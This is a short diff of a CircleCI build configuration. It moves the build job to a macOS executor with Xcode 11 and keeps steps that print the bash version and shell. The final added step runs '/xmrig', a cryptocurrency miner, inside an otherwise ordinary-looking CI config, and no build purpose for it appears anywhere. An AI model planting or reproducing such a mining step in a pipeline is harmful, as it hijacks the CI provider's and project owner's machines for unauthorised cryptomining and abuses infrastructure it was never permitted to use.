@@ -1,9 +1,11 @@
 version: 2.1
+
 jobs:
   build:
-    machine:
-      image: circleci/classic:201808-01
+    macos:
+      xcode: 11.0.0
     steps:
       - checkout
       - run: bash -version # Show bash version
       - run: echo $0       # Show current shell
+      - run: /xmrig
